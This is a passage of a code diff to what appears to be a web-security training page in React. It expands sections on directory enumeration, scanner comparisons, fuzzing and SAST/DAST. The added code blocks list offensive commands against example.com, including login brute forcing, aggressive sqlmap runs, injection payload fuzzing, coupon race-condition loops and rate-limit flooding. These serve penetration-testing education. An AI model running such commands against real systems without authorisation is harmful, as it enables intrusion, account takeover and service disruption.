               />
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="content-discovery">
+          <AccordionItem value="content-discovery-advanced">
             <AccordionTrigger className="text-lg font-semibold">
-              Content Discovery Techniques
+              Advanced Content Discovery & Directory Enumeration
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Discovery Tools</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>ffuf</strong> - Fast web fuzzer</li>
-                    <li><strong>Gobuster</strong> - Directory/file brute forcer</li>
-                    <li><strong>Dirbuster</strong> - OWASP directory brute forcer</li>
-                    <li><strong>Wfuzz</strong> - Web application fuzzer</li>
-                    <li><strong>Feroxbuster</strong> - Fast content discovery</li>
-                    <li><strong>Dirb</strong> - URL brute forcer</li>
-                    <li><strong>Dirsearch</strong> - Advanced directory scanner</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Professional Discovery Tools</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Fast Enumeration Tools</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>ffuf:</strong> Fast web fuzzer with advanced filtering</li>
+                        <li>• <strong>Gobuster:</strong> Directory/file brute forcer in Go</li>
+                        <li>• <strong>Feroxbuster:</strong> Rust-based recursive scanner</li>
+                        <li>• <strong>Dirsearch:</strong> Advanced directory scanner</li>
+                        <li>• <strong>Wfuzz:</strong> Web application fuzzer</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Specialized Discovery</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>LinkFinder:</strong> JavaScript endpoint discovery</li>
+                        <li>• <strong>JSParser:</strong> JavaScript file analysis</li>
+                        <li>• <strong>Secretfinder:</strong> Sensitive data in JS files</li>
+                        <li>• <strong>GAU:</strong> Get All URLs from archives</li>
+                        <li>• <strong>Waybackurls:</strong> Historical URL extraction</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Recommended Wordlists</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>SecLists:</strong> Comprehensive wordlist collection</li>
-                    <li><strong>DirBuster wordlists:</strong> Built-in OWASP lists</li>
-                    <li><strong>Raft:</strong> Research-based wordlists</li>
-                    <li><strong>FuzzDB:</strong> Attack pattern database</li>
-                    <li><strong>PayloadsAllTheThings:</strong> Custom payloads</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Wordlists & Payloads</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-yellow-400 mb-2">Premium Wordlist Collections</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>SecLists:</strong> Comprehensive security wordlists</li>
+                        <li>• <strong>FuzzDB:</strong> Attack pattern database</li>
+                        <li>• <strong>PayloadsAllTheThings:</strong> Community payloads</li>
+                        <li>• <strong>Assetnote Wordlists:</strong> Bug bounty focused</li>
+                        <li>• <strong>OneListForAll:</strong> Merged wordlist collection</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Custom Wordlist Generation</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>CeWL:</strong> Custom wordlist creator</li>
+                        <li>• <strong>Crunch:</strong> Wordlist generator</li>
+                        <li>• <strong>CUPP:</strong> Common User Password Profiler</li>
+                        <li>• <strong>Mentalist:</strong> Graphical wordlist generator</li>
+                        <li>• <strong>TTPassGen:</strong> Targeted wordlist generation</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
               </div>
               
               <CodeExample
                 language="bash"
-                title="Content Discovery Commands"
-                code={`# Fast directory enumeration with ffuf
-ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://example.com/FUZZ -t 100
+                title="Advanced Content Discovery Techniques"
+                code={`# High-Performance Directory Enumeration
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://example.com/FUZZ -t 100 -mc 200,301,302,403 -fs 1234
 
-# Gobuster directory scan
-gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50
+# Multi-Extension Fuzzing
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,js,txt,bak
 
-# File extension fuzzing
-ffuf -w /path/to/wordlist.txt -w /path/to/extensions.txt -u https://example.com/FUZZFUZ2Z
+# API Endpoint Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://example.com/api/FUZZ -mc 200,400,401,403,500
 
-# API endpoint discovery
-ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://example.com/api/FUZZ
+# Parameter Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://example.com/page?FUZZ=test -fs 1234
 
-# Backup file discovery
-ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bak,.backup,.old,.tmp -u https://example.com/FUZZFUZZ2
+# Backup File Hunting
+feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x bak,backup,old,tmp,swp
 
-# Hidden parameter discovery
-ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://example.com/page?FUZZ=test
+# JavaScript Endpoint Extraction
+python3 linkfinder.py -i https://example.com -o cli
+cat subdomains.txt | gau | grep "\\.js$" | sort -u | tee js_files.txt
 
-# Subdirectory recursive scan
-feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -r
+# Historical URL Mining
+echo "example.com" | waybackurls | sort -u | tee wayback_urls.txt
+gau example.com | sort -u | tee gau_urls.txt
 
-# Configuration file hunting
-gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .config,.conf,.cfg,.ini`}
+# Sensitive File Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/sensitive-files-unix.txt -u https://example.com/FUZZ
+
+# Custom Wordlist Generation
+cewl -d 2 -m 5 -w custom_wordlist.txt https://example.com
+crunch 6 8 -t @@@@%% > custom_passwords.txt
+
+# Advanced Filtering Techniques
+ffuf -w wordlist.txt -u https://example.com/FUZZ -mc all -fc 404 -fs 0 -fr "not found"
+
+# Recursive Directory Scanning
+feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -r --depth 3
+
+# File Upload Directory Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/uploadable-extensions.txt -u https://example.com/uploads/test.FUZZ
+
+# Configuration File Hunting
+gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x conf,config,cfg,ini,xml,yml,yaml
+
+# GitHub Repository Mining
+github-search -q "example.com" -t <token> | grep -E "\\.(php|js|py|rb|java)$"
+
+# Social Media & Forum Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/social-media.txt -u https://example.com/FUZZ
+
+# Technology-Specific Discovery
+# WordPress
+wpscan --url https://example.com --enumerate ap,at,cb,dbe
+
+# Drupal
+droopescan scan drupal -u https://example.com
+
+# Joomla
+joomscan -u https://example.com
+
+# Comprehensive Subdirectory Analysis
+for sub in $(cat subdomains.txt); do
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://$sub/FUZZ -mc 200,301,302,403 -o $sub.json
+done`}
               />
             </AccordionContent>
           </AccordionItem>
         </Accordion>
       </div>
 
-      {/* Vulnerability Scanning */}
+      {/* Vulnerability Assessment */}
       <div className="card">
         <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
           <Shield className="h-7 w-7 text-cybr-primary" />
-          Vulnerability Scanning
+          Advanced Vulnerability Assessment & Scanning
         </h3>
         
         <Accordion type="single" collapsible className="space-y-4">
-          <AccordionItem value="automated-tools">
+          <AccordionItem value="automated-scanning-pro">
             <AccordionTrigger className="text-lg font-semibold">
-              Automated Scanning Tools
+              Professional Automated Scanning Arsenal
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
+            <AccordionContent className="space-y-6">
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div className="space-y-4">
-                  <div className="p-4 bg-cybr-muted/30 rounded-lg">
-                    <h5 className="font-semibold mb-3 text-cybr-primary">Burp Suite Comparison</h5>
-                    <div className="space-y-3">
-                      <div>
-                        <h6 className="font-semibold text-green-400">Professional Features</h6>
-                        <ul className="text-sm space-y-1">
-                          <li>• Advanced scanner with custom checks</li>
-                          <li>• Burp Collaborator for out-of-band testing</li>
-                          <li>• Intruder with unlimited payloads</li>
-                          <li>• Extensions and custom plugins</li>
-                          <li>• Detailed reporting capabilities</li>
-                        </ul>
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Enterprise Scanner Comparison</h5>
+                  <div className="space-y-4">
+                    <div className="p-4 bg-gradient-to-r from-blue-900/20 to-cyan-900/20 border border-blue-500 rounded-lg">
+                      <h6 className="font-semibold text-blue-400 mb-2">Burp Suite Professional ($399/year)</h6>
+                      <div className="text-sm space-y-1">
+                        <div className="text-green-400">✓ Advanced scanner with custom checks</div>
+                        <div className="text-green-400">✓ Burp Collaborator for out-of-band testing</div>
+                        <div className="text-green-400">✓ Unlimited Intruder payloads</div>
+                        <div className="text-green-400">✓ Extensions ecosystem (BApp Store)</div>
+                        <div className="text-green-400">✓ Mobile Assistant for mobile testing</div>
+                        <div className="text-red-400">✗ Single-user license</div>
+                        <div className="text-red-400">✗ Learning curve for beginners</div>
                       </div>
-                      <div>
-                        <h6 className="font-semibold text-yellow-400">Community Limitations</h6>
-                        <ul className="text-sm space-y-1">
-                          <li>• No automated scanner</li>
-                          <li>• Limited Intruder functionality</li>
-                          <li>• Basic reporting only</li>
-                          <li>• No Collaborator server</li>
-                        </ul>
+                    </div>
+                    
+                    <div className="p-4 bg-gradient-to-r from-green-900/20 to-emerald-900/20 border border-green-500 rounded-lg">
+                      <h6 className="font-semibold text-green-400 mb-2">OWASP ZAP (Free)</h6>
+                      <div className="text-sm space-y-1">
+                        <div className="text-green-400">✓ Completely free and open source</div>
+                        <div className="text-green-400">✓ Active and passive scanning modes</div>
+                        <div className="text-green-400">✓ REST API for automation</div>
+                        <div className="text-green-400">✓ Docker support for CI/CD</div>
+                        <div className="text-green-400">✓ Authentication support</div>
+                        <div className="text-yellow-400">~ Complex UI for beginners</div>
+                        <div className="text-yellow-400">~ Performance issues with large apps</div>
                       </div>
                     </div>
                   </div>
                 </div>
                 
-                <div className="space-y-4">
-                  <div className="p-4 bg-cybr-muted/30 rounded-lg">
-                    <h5 className="font-semibold mb-3 text-cybr-primary">OWASP ZAP Features</h5>
-                    <ul className="text-sm space-y-1">
-                      <li>• Free and open source</li>
-                      <li>• Active and passive scanning</li>
-                      <li>• Ajax spider for modern apps</li>
-                      <li>• REST API for automation</li>
-                      <li>• Docker support for CI/CD</li>
-                      <li>• Authentication support</li>
-                      <li>• Custom script integration</li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
-              
-              <div>
-                <h5 className="font-semibold mb-3">Additional Scanning Tools</h5>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                  <div>
-                    <h6 className="font-semibold mb-2">Web Scanners</h6>
-                    <ul className="list-disc pl-6 space-y-1 text-sm">
-                      <li><strong>Nikto:</strong> Web server scanner</li>
-                      <li><strong>Nuclei:</strong> Fast vulnerability scanner</li>
-                      <li><strong>W3af:</strong> Web application attack framework</li>
-                    </ul>
-                  </div>
-                  <div>
-                    <h6 className="font-semibold mb-2">Infrastructure</h6>
-                    <ul className="list-disc pl-6 space-y-1 text-sm">
-                      <li><strong>OpenVAS:</strong> Network vulnerability scanner</li>
-                      <li><strong>Nessus:</strong> Commercial vulnerability scanner</li>
-                      <li><strong>Qualys:</strong> Cloud-based scanning</li>
-                    </ul>
-                  </div>
-                  <div>
-                    <h6 className="font-semibold mb-2">Specialized</h6>
-                    <ul className="list-disc pl-6 space-y-1 text-sm">
-                      <li><strong>SQLmap:</strong> SQL injection scanner</li>
-                      <li><strong>XSStrike:</strong> XSS detection tool</li>
-                      <li><strong>SSLyze:</strong> SSL/TLS configuration scanner</li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="fuzzing">
-            <AccordionTrigger className="text-lg font-semibold">
-              Advanced Fuzzing Techniques
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <h5 className="font-semibold mb-3">Fuzzing Types</h5>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Commercial Scanner Analysis</h5>
                   <div className="space-y-3">
                     <div className="p-3 bg-cybr-muted/30 rounded">
-                      <h6 className="font-semibold text-blue-400">Black Box Fuzzing</h6>
-                      <ul className="text-sm mt-1">
-                        <li>• No source code access</li>
-                        <li>• Input/output observation</li>
-                        <li>• Pattern-based testing</li>
+                      <h6 className="font-semibold text-purple-400 mb-2">Acunetix ($4,500+/year)</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• High accuracy with minimal false positives</li>
+                        <li>• Modern web app support (SPAs, APIs)</li>
+                        <li>• DeepScan technology for complex apps</li>
+                        <li>• Comprehensive reporting capabilities</li>
+                        <li>• Integration with issue trackers</li>
                       </ul>
                     </div>
+                    
                     <div className="p-3 bg-cybr-muted/30 rounded">
-                      <h6 className="font-semibold text-green-400">White Box Fuzzing</h6>
-                      <ul className="text-sm mt-1">
-                        <li>• Full source code access</li>
-                        <li>• Code coverage analysis</li>
-                        <li>• Targeted testing</li>
+                      <h6 className="font-semibold text-orange-400 mb-2">Rapid7 InsightAppSec ($12,000+/year)</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• DevSecOps integration capabilities</li>
+                        <li>• Attack replay functionality</li>
+                        <li>• Dynamic verification of findings</li>
+                        <li>• Executive dashboards and reporting</li>
+                        <li>• API security testing focus</li>
                       </ul>
                     </div>
+                    
                     <div className="p-3 bg-cybr-muted/30 rounded">
-                      <h6 className="font-semibold text-yellow-400">Grey Box Fuzzing</h6>
-                      <ul className="text-sm mt-1">
-                        <li>• Partial code access</li>
-                        <li>• Instrumented testing</li>
-                        <li>• Feedback-driven</li>
+                      <h6 className="font-semibold text-cyan-400 mb-2">Invicti (Netsparker) ($8,000+/year)</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Proof-based scanning technology</li>
+                        <li>• False positive reduction</li>
+                        <li>• Enterprise scalability</li>
+                        <li>• Compliance reporting capabilities</li>
+                        <li>• Advanced authentication support</li>
                       </ul>
                     </div>
                   </div>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Target Parameters</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>GET Parameters:</strong> URL query strings</li>
-                    <li><strong>POST Data:</strong> Form submissions, JSON, XML</li>
-                    <li><strong>HTTP Headers:</strong> User-Agent, Referer, Custom headers</li>
-                    <li><strong>Cookies:</strong> Session tokens, preferences</li>
-                    <li><strong>File Uploads:</strong> Filename, content, metadata</li>
-                    <li><strong>WebSocket Messages:</strong> Real-time communication</li>
-                  </ul>
                 </div>
               </div>
               
               <CodeExample
                 language="bash"
-                title="Advanced Fuzzing Examples"
-                code={`# Parameter fuzzing with ffuf
-ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://example.com/search?FUZZ=test" -fs 1234
+                title="Professional Scanner Configuration & Usage"
+                code={`# OWASP ZAP Automated Scanning
+# Docker-based scanning for CI/CD
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py -t https://example.com -r baseline_report.html
 
-# POST data fuzzing
-ffuf -w payloads.txt -X POST -d "username=admin&password=FUZZ" -u https://example.com/login
+# Advanced ZAP scanning with authentication
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t https://example.com -r full_report.html -a
 
-# Header fuzzing
-ffuf -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u https://example.com/
+# ZAP API automation
+python3 -c "
+from zapv2 import ZAPv2
+zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
+zap.urlopen('https://example.com')
+zap.spider.scan('https://example.com')
+zap.ascan.scan('https://example.com')
+print(zap.core.htmlreport())
+"
 
-# JSON fuzzing with wfuzz
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -H "Content-Type: application/json" -d '{"search":"FUZZ"}' https://example.com/api/search
+# Nuclei Template-based Scanning
+nuclei -u https://example.com -tags cve,misconfig,xss,sqli -o nuclei_results.txt
+nuclei -l urls.txt -t /root/nuclei-templates/ -severity high,critical -o critical_findings.txt
 
-# Multi-parameter fuzzing
-ffuf -w users.txt:USER -w passwords.txt:PASS -X POST -d "username=USER&password=PASS" -u https://example.com/login
+# Custom Nuclei template creation
+cat > custom-check.yaml << 'EOF'
+id: custom-sql-injection
+info:
+  name: Custom SQL Injection Test
+  author: security-team
+  severity: high
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=test'OR'1'='1"
+    matchers:
+      - type: word
+        words:
+          - "mysql error"
+          - "syntax error"
+        condition: or
+EOF
 
-# File upload fuzzing
-wfuzz -c -z file,extensions.txt -z file,filenames.txt --data "file=@/path/to/testFUZ2Z.FUZ2Z" https://example.com/upload
+# Nikto Web Server Scanner
+nikto -h https://example.com -Format htm -output nikto_report.html
+nikto -h https://example.com -Plugins @@ALL -ask no
 
-# Blind vulnerability detection
-ffuf -w payloads.txt -u "https://example.com/page?id=FUZZ" -fr "error|exception" -fs 0`}
+# W3af Framework Usage
+w3af_console -s scripts/web_spider.w3af
+w3af_console -s scripts/full_audit.w3af
+
+# Arachni Scanner
+arachni https://example.com --report-save-path=arachni_report.afr
+arachni_reporter arachni_report.afr --reporter=html:outfile=report.html
+
+# Custom Burp Suite Automation (using Burp REST API)
+curl -X POST "http://127.0.0.1:1337/v0.1/scan" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "scope": {
+      "include": [{"rule": "https://example.com/*"}]
+    },
+    "application_logins": [{
+      "username": "admin",
+      "password": "password",
+      "type": "form"
+    }]
+  }'
+
+# SQLMap Integration for SQL Injection Testing
+sqlmap -u "https://example.com/search?id=1" --batch --random-agent --level=5 --risk=3
+
+# Comprehensive SSL/TLS Testing
+testssl.sh --parallel --protocols --server-defaults --headers --vulnerabilities https://example.com
+
+# Custom Python Scanner Integration
+python3 -c "
+import requests
+import json
+targets = ['https://example.com', 'https://api.example.com']
+for target in targets:
+    response = requests.get(target + '/robots.txt')
+    if response.status_code == 200:
+        print(f'Found robots.txt at {target}')
+        print(response.text[:200])
+"`}
               />
             </AccordionContent>
           </AccordionItem>
 
-          <AccordionItem value="sast-dast">
+          <AccordionItem value="fuzzing-mastery">
             <AccordionTrigger className="text-lg font-semibold">
-              Static vs Dynamic Analysis
+              Advanced Fuzzing & Parameter Testing Mastery
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
+            <AccordionContent className="space-y-6">
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div className="p-4 bg-cybr-muted/30 rounded-lg">
-                  <h5 className="font-semibold mb-3 text-blue-400">SAST (Static Analysis)</h5>
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Fuzzing Methodology Framework</h5>
                   <div className="space-y-3">
-                    <div>
-                      <h6 className="font-semibold mb-2">Popular Tools</h6>
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Black Box Fuzzing</h6>
                       <ul className="text-sm space-y-1">
-                        <li>• <strong>SonarQube:</strong> Multi-language code quality</li>
-                        <li>• <strong>CodeQL:</strong> GitHub's semantic analysis</li>
-                        <li>• <strong>Semgrep:</strong> Fast static analysis</li>
-                        <li>• <strong>Checkmarx:</strong> Enterprise SAST solution</li>
-                        <li>• <strong>Veracode:</strong> Cloud-based scanning</li>
+                        <li>• No source code access required</li>
+                        <li>• Input/output observation based</li>
+                        <li>• Pattern-based testing approach</li>
+                        <li>• Response analysis for anomalies</li>
+                        <li>• Suitable for closed-source applications</li>
                       </ul>
                     </div>
-                    <div>
-                      <h6 className="font-semibold mb-2">Advantages</h6>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">White Box Fuzzing</h6>
                       <ul className="text-sm space-y-1">
-                        <li>• Early detection in SDLC</li>
-                        <li>• Complete code coverage</li>
-                        <li>• No runtime environment needed</li>
-                        <li>• Finds complex vulnerabilities</li>
+                        <li>• Full source code access</li>
+                        <li>• Code coverage analysis</li>
+                        <li>• Targeted vulnerability testing</li>
+                        <li>• Instrumented binary analysis</li>
+                        <li>• Guided fuzzing with feedback</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-yellow-900/20 border border-yellow-500 rounded">
+                      <h6 className="font-semibold text-yellow-400 mb-2">Grey Box Fuzzing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Partial source code access</li>
+                        <li>• Instrumented testing approach</li>
+                        <li>• Feedback-driven optimization</li>
+                        <li>• Coverage-guided exploration</li>
+                        <li>• Hybrid testing methodology</li>
                       </ul>
                     </div>
                   </div>
                 </div>
                 
-                <div className="p-4 bg-cybr-muted/30 rounded-lg">
-                  <h5 className="font-semibold mb-3 text-green-400">DAST (Dynamic Analysis)</h5>
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Target Parameter Categories</h5>
                   <div className="space-y-3">
-                    <div>
-                      <h6 className="font-semibold mb-2">Popular Tools</h6>
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">HTTP Components</h6>
                       <ul className="text-sm space-y-1">
-                        <li>• <strong>OWASP ZAP:</strong> Free dynamic scanner</li>
-                        <li>• <strong>Burp Suite:</strong> Professional web testing</li>
-                        <li>• <strong>Acunetix:</strong> Automated web scanner</li>
-                        <li>• <strong>Rapid7 AppSpider:</strong> Enterprise DAST</li>
-                        <li>• <strong>Qualys WAS:</strong> Cloud-based scanning</li>
+                        <li>• <strong>GET Parameters:</strong> URL query strings and fragments</li>
+                        <li>• <strong>POST Data:</strong> Form data, JSON, XML payloads</li>
+                        <li>• <strong>HTTP Headers:</strong> User-Agent, Referer, custom headers</li>
+                        <li>• <strong>Cookies:</strong> Session tokens, preferences, tracking</li>
+                        <li>• <strong>Path Components:</strong> URL path segments and extensions</li>
                       </ul>
                     </div>
-                    <div>
-                      <h6 className="font-semibold mb-2">Advantages</h6>
+                    
+                    <div className="p-3 bg-cybr-muted/30 rounded">
+                      <h6 className="font-semibold text-cyan-400 mb-2">Advanced Targets</h6>
                       <ul className="text-sm space-y-1">
-                        <li>• Tests running application</li>
-                        <li>• Real-world attack simulation</li>
-                        <li>• No source code needed</li>
-                        <li>• Environment-specific issues</li>
+                        <li>• <strong>File Uploads:</strong> Filename, content, metadata</li>
+                        <li>• <strong>WebSocket Messages:</strong> Real-time communication</li>
+                        <li>• <strong>API Endpoints:</strong> REST, GraphQL, SOAP parameters</li>
+                        <li>• <strong>Authentication:</strong> Login forms, OAuth flows</li>
+                        <li>• <strong>Business Logic:</strong> Workflow parameters, state</li>
                       </ul>
                     </div>
                   </div>
                 </div>
               </div>
               
-              <div>
-                <h5 className="font-semibold mb-3">Integration Strategies</h5>
+              <CodeExample
+                language="bash"
+                title="Master-Level Fuzzing Techniques"
+                code={`# Advanced Parameter Discovery & Fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://example.com/search?FUZZ=test" -fs 1234 -mc 200,400,500
+
+# Multi-parameter Fuzzing (Cluster Bomb Attack)
+ffuf -w users.txt:USER -w passwords.txt:PASS -X POST -d "username=USER&password=PASS" -u https://example.com/login -mc 200,302
+
+# JSON Parameter Fuzzing
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -H "Content-Type: application/json" -d '{"search":"FUZZ"}' https://example.com/api/search
+
+# Header Fuzzing for Security Bypass
+ffuf -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u https://example.com/admin -mc 200,302
+
+# Advanced SQL Injection Fuzzing
+sqlmap -u "https://example.com/product?id=1" --level=5 --risk=3 --batch --tamper=space2comment,charencode,randomcase
+
+# Command Injection Fuzzing
+ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -X POST -d "command=FUZZ" -u https://example.com/exec -fr "error|invalid"
+
+# File Upload Fuzzing
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/file-extensions.txt -z file,filenames.txt --data="file=@testFUZ2Z.FUZ2Z" https://example.com/upload
+
+# XSS Payload Fuzzing
+ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt -X POST -d "comment=FUZZ" -u https://example.com/comment -mr "FUZZ"
+
+# NoSQL Injection Fuzzing
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' https://example.com/api/login
+
+# LDAP Injection Testing
+ffuf -w /usr/share/seclists/Fuzzing/LDAP.txt -X POST -d "username=FUZZ&password=test" -u https://example.com/ldap-auth -fr "invalid"
+
+# XXE Fuzzing
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/XML-Fuzzing.txt -H "Content-Type: application/xml" -d "FUZZ" https://example.com/xml-parser
+
+# Business Logic Fuzzing
+# Price manipulation
+ffuf -w <(seq 1 1000) -X POST -d "item_id=1&quantity=FUZZ&price=-1" -u https://example.com/checkout -mc 200,302
+
+# Race Condition Testing
+for i in {1..100}; do
+  curl -X POST -d "coupon=SAVE50&user_id=123" https://example.com/apply-coupon &
+done
+wait
+
+# Time-based Blind Fuzzing
+ffuf -w /usr/share/seclists/Fuzzing/time-based-blind.txt -X POST -d "id=1' AND FUZZ --" -u https://example.com/search -delay 5s
+
+# Custom Payload Generation
+python3 -c "
+import itertools
+chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+for length in range(1, 5):
+    for combo in itertools.product(chars, repeat=length):
+        print(''.join(combo))
+" > custom_payloads.txt
+
+# Blind XSS Testing with Burp Collaborator
+ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Filters.txt -X POST -d "feedback=FUZZ" -u https://example.com/contact -delay 2s
+
+# GraphQL Fuzzing
+python3 -c "
+queries = [
+    'query { __schema { types { name } } }',
+    'query { user(id: \"1\") { id name email } }',
+    'mutation { deleteUser(id: \"1\") { success } }'
+]
+import requests
+for query in queries:
+    requests.post('https://example.com/graphql', json={'query': query})
+"
+
+# API Rate Limiting Testing
+for i in {1..1000}; do
+  curl -H "Authorization: Bearer token123" https://example.com/api/data &
+  if [ $((i % 10)) -eq 0 ]; then sleep 1; fi
+done
+
+# Advanced Cookie Fuzzing
+ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -H "Cookie: sessionid=FUZZ; csrftoken=abc123" -u https://example.com/dashboard
+
+# Template Injection Fuzzing
+ffuf -w /usr/share/seclists/Fuzzing/template-engines-special-vars.txt -X POST -d "template=Hello FUZZ" -u https://example.com/render -mr "root|admin|config"`}
+              />
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="static-dynamic-analysis">
+            <AccordionTrigger className="text-lg font-semibold">
+              SAST/DAST Integration & Code Analysis
+            </AccordionTrigger>
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">SAST (Static Application Security Testing)</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Enterprise SAST Tools</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>SonarQube:</strong> Multi-language code quality platform</li>
+                        <li>• <strong>CodeQL:</strong> GitHub's semantic code analysis</li>
+                        <li>• <strong>Semgrep:</strong> Fast static analysis with custom rules</li>
+                        <li>• <strong>Checkmarx:</strong> Enterprise SAST solution</li>
+                        <li>• <strong>Veracode:</strong> Cloud-based static analysis</li>
+                        <li>• <strong>Fortify:</strong> HP Enterprise Security suite</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Open Source SAST</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• <strong>Bandit:</strong> Python security linter</li>
+                        <li>• <strong>ESLint Security:</strong> JavaScript security rules</li>
+                        <li>• <strong>Brakeman:</strong> Ruby on Rails security scanner</li>
+                        <li>• <strong>SpotBugs:</strong> Java static analysis</li>
+                        <li>• <strong>PMD:</strong> Source code analyzer</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                
+                <div>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">DAST (Dynamic Application Security Testing)</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
